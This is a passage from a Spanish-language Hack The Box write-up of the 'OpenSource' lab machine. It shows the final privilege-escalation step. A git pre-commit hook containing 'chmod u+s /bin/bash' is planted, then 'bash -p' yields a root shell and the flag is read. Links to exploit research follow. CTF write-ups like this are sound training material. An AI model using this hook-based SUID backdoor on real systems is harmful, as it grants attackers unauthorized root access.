+</span></span><span style="display:flex;"><span>drwxrwxr-x  <span style="color:#ae81ff">5</span> dev01 dev01 <span style="color:#ae81ff">4096</span> May  <span style="color:#ae81ff">4</span>  <span style="color:#ae81ff">2022</span> refs
+</span></span></code></pre></div><p>Hay un directorio <strong>hooks</strong>. Investiguemos a que pertenece.</p>
+<table>
+	<thead>
+			<tr>
+					<th style="text-align: center"><strong>Git Hooks</strong></th>
+			</tr>
+	</thead>
+	<tbody>
+			<tr>
+					<td style="text-align: center"><em>Los hooks de Git son scripts que se ejecutan automáticamente cada vez que se produce un evento concreto en un repositorio de Git. Permiten personalizar el comportamiento interno de Git y desencadenar acciones personalizables en puntos clave del ciclo de vida del desarrollo.</em></td>
+			</tr>
+	</tbody>
+</table>
+<p>Resulta que hay una forma de abusar de estos, la puedes encontrar aquí: <a href="https://gtfobins.github.io/gtfobins/git/" target="_blank">GTFOBins: git</a></p>
+<p>Vamos a crear un hook que cambie los permisos de la <strong>Bash</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>dev01@opensource:~/.git/hooks$ echo <span style="color:#e6db74">&#39;chmod u+s /bin/bash&#39;</span> &gt; <span style="color:#e6db74">&#34;pre-commit&#34;</span>
+</span></span></code></pre></div><p>Revisa los permisos de la <strong>Bash</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>dev01@opensource:~/.git/hooks$ ls -la /bin/bash
+</span></span><span style="display:flex;"><span>-rwxr-xr-x <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">1113504</span> Apr <span style="color:#ae81ff">18</span>  <span style="color:#ae81ff">2022</span> /bin/bash
+</span></span></code></pre></div><p>Dale permisos de ejecución al hook:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>dev01@opensource:~/.git/hooks$ chmod +x pre-commit
+</span></span></code></pre></div><p>Ahora, revisa si cambiaron los permisos de la <strong>Bash</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>dev01@opensource:~/.git/hooks$ ls -la /bin/bash
+</span></span><span style="display:flex;"><span>-rwsr-xr-x <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">1113504</span> Apr <span style="color:#ae81ff">18</span>  <span style="color:#ae81ff">2022</span> /bin/bash
+</span></span></code></pre></div><p>Excelente, ya solo entramos a la <strong>Bash</strong> y obtenemos la flag:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>dev01@opensource:/$ bash -p
+</span></span><span style="display:flex;"><span>bash-4.4# whoami
+</span></span><span style="display:flex;"><span>root
+</span></span><span style="display:flex;"><span>bash-4.4# cd /root
+</span></span><span style="display:flex;"><span>bash-4.4# ls
+</span></span><span style="display:flex;"><span>config  meta  root.txt  snap
+</span></span><span style="display:flex;"><span>bash-4.4# cat root.txt
+</span></span><span style="display:flex;"><span>...
+</span></span></code></pre></div><p>Hemos terminado la máquina.</p>
+
+
+    
+    <h2 id="links-de-investigacion">Links de investigación</h2>
+    <ul>
+      <li><a href="https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/werkzeug#werkzeug-console-pin-exploit" target="_blank" rel="noopener noreferrer">https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/werkzeug#werkzeug-console-pin-exploit</a></li><li><a href="https://github.com/pallets/werkzeug/blob/main/src/werkzeug/debug/__init__.py" target="_blank" rel="noopener noreferrer">https://github.com/pallets/werkzeug/blob/main/src/werkzeug/debug/__init__.py</a></li><li><a href="https://linuxhandbook.com/scan-ports-netcat/" target="_blank" rel="noopener noreferrer">https://linuxhandbook.com/scan-ports-netcat/</a></li><li><a href="https://github.com/jpillora/chisel/releases" target="_blank" rel="noopener noreferrer">https://github.com/jpillora/chisel/releases</a></li><li><a href="https://es.wikipedia.org/wiki/Gitea" target="_blank" rel="noopener noreferrer">https://es.wikipedia.org/wiki/Gitea</a></li><li><a href="https://github.com/DominicBreuker/pspy" target="_blank" rel="noopener noreferrer">https://github.com/DominicBreuker/pspy</a></li><li><a href="https://www.atlassian.com/es/git/tutorials/git-hooks" target="_blank" rel="noopener noreferrer">https://www.atlassian.com/es/git/tutorials/git-hooks</a></li><li><a href="https://gtfobins.github.io/gtfobins/git/" target="_blank" rel="noopener noreferrer">https://gtfobins.github.io/gtfobins/git/</a></li>
+    </ul>
+    
+  </div>
+
+  
+
+
+  
+
+  
+
+
+
+
+
+
+
+
+
+
+<nav class="post-nav">
+  
+  <a class="post-nav-link post-nav-prev" href="http://localhost:1313/htb-writeup-scrambled/">
+    <span class="post-nav-label">← Anterior</span>
+    <span class="post-nav-title">Scrambled - Hack The Box</span>
+  </a>
+  
+  
+  <a class="post-nav-link post-nav-next" href="http://localhost:1313/htb-writeup-forest/">
+    <span class="post-nav-label">Siguiente →</span>
+    <span class="post-nav-title">Forest - Hack The Box</span>
+  </a>
+  
+</nav>
+
+
+
+</article>
+
+  </main>
+  <footer class="site-footer">
+  <div class="wrap">
+    <p>&copy; 2026 BerserkWings · México
+       · <a href="https://github.com/BerserkWings" target="_blank" rel="noopener noreferrer">GitHub</a>
+    </p>
+  </div>
+</footer>
+
+  
+
+
+<a href="#indice" class="back-to-top" id="backToTop" aria-label="Volver al índice">&uarr;</a>
+
+
+<script src="/js/main.min.15ff80349759f71df793ae28568ef0a6a9c3eb6efe99c9e96bad1d9236a26c31.js" integrity="sha256-Ff&#43;ANJdZ9x33k64oVo7wpqnD627&#43;mcnpa60dkjaibDE=" defer></script>
+
+</body>
+</html>
